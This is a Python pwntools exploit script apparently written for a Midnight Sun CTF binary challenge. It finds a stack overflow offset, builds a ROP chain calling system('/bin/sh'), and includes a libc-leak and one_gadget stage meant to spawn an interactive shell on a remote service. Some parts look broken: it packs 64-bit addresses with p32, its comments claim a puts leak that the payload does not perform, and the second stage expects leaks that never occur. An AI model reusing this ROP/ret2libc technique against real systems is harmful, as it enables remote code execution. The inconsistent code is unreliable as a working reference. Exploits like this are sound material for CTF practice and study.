from pwn import *
from struct import pack
import time

##########################################################################
# My approach to Binary Exploitation on ASLR Enabled systems.
# DOWNLOAD PWNTOOLS TO RUN!
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

nops = b'\x90'
padding = b'\x00'

clean = lambda x: x.split('\n')[1:-2]
pad = lambda x: x + padding*(8-len(x))

LOCAL_LIBC = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"
REMOTE_LIBC = "libc.so"

REMOTE_IP = 'pwn3-01.play.midnightsunctf.se'
REMOTE_PORT = 10003

VULN_BIN = './pwn3'

GDB_FLAGS = """
            b *0x400716 
            b *0x4006fa
            c
            """

READUNTIL_STRING = 'buffer: '

##########################################################################
# Load Binaries and Respective libc
#
# To Find the Libc version, make ROP chain to print address of libc
# functions, which are stored in GOT table as values of pointers.
# Just pass the address of pointer to RDI through pop rdi; ret
# And call puts function.
# TO FIND LIBC VERSION, use https://libc.blukat.me/
##########################################################################

elf = ELF(VULN_BIN)
context.binary = VULN_BIN
# libc  = ELF("/usr/lib/x86_64-linux-gnu/libc-2.31.so")
##########################################################################
# Find Offset
##########################################################################

r = elf.process()
crash = cyclic(1024)
r.clean()
r.sendline(crash)
r.wait()
core = r.corefile
rsp = core.rsp
offset = core.read(rsp, 4)
offset =  cyclic_find(offset)
success("Offset found @ {a} bytes".format(a=offset))

##########################################################################
# Generate Initial Payload to Leak memory
##########################################################################

# Find manually
crashOffset = offset

rop = ROP(elf)

junk = b'\x00'*(crashOffset)
poper = p32(0x1fb5c-4)#p32(0x1fb5c)#p32(rop.find_gadget(['pop rdi']).address)
binsh = p32(0x49018)#p32(0x00049018)
system = p32(0x1480c)

##########################################################################
# Demo ==> (poprdi + puts + putsret) 
# puts -> pointer of GOT table entry of puts
# putsret -> stub function calling actual puts
# TO FIND LIBC VERSION, use https://libc.blukat.me/
# Use ROPgadget to find gadgets
##########################################################################

### This Payload prints puts and gets addressed and calls main function again
payload = b''.join([junk, \
    poper, binsh, binsh, system])

def exploitFirstStage(payload, local=False):
    if local:
        r = elf.process()
        # gdb.attach(r.pid, GDB_FLAGS)
    else:
        r = remote(REMOTE_IP, REMOTE_PORT)
    # print(r.readuntil(READUNTIL_STRING))  
    r.clean()
    r.sendline(payload)
    return r

for i in range(offset, offset+1):
    try:
        print("Try ", i)
        payload = b''.join([b'\x00'*i, \
        poper, binsh, binsh, system])
        a = exploitFirstStage(payload, local=True)
        a.clean() 
        a.interactive()
    except Exception as e:
        print(i, "Failed", e)


##########################################################################
# Compute Libc Base address from leaked addresses
##########################################################################

def computeLibcBase(r, libc):
    puts_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    fgets_leak = u64(pad(r.readline())) & 0x0ffffffffffff
    print("puts: ", hex(puts_leak))
    print("gets: ", hex(fgets_leak))
    puts_offset = libc.symbols['puts']
    libc_base = puts_leak - puts_offset
    # This address must be 0x1000 aligned, if not, its Probably wrong!
    print("libc base: ", hex(libc_base))
    if(libc_base & 0x0000000000000fff):
        print("ALERT! Program is probably using different libc than specified!")
    return libc_base

##########################################################################
# Now Actual Exploitation!
# Use libc base address to generate address of a one gadget!
# use one_gadget to find one gadgets
##########################################################################

def exploit(local=False, one_gadget=0x10a38c):
    if local:
        libc = ELF(LOCAL_LIBC)
    else:
        libc = ELF(REMOTE_LIBC)
    r = exploitFirstStage(payload, local=False)
    libc_base = computeLibcBase(r, libc)
    time.sleep(1)
    r.clean()
    # sys_offset = p32(0x45390 + libc_base)
    one_gadget = p32( one_gadget + libc_base) # from one_gadget
    npayload = b''.join([junk, \
        one_gadget, padding*8])
    r.clean()
    r.sendline(npayload)
    # Get Interactive shell
    r.interactive()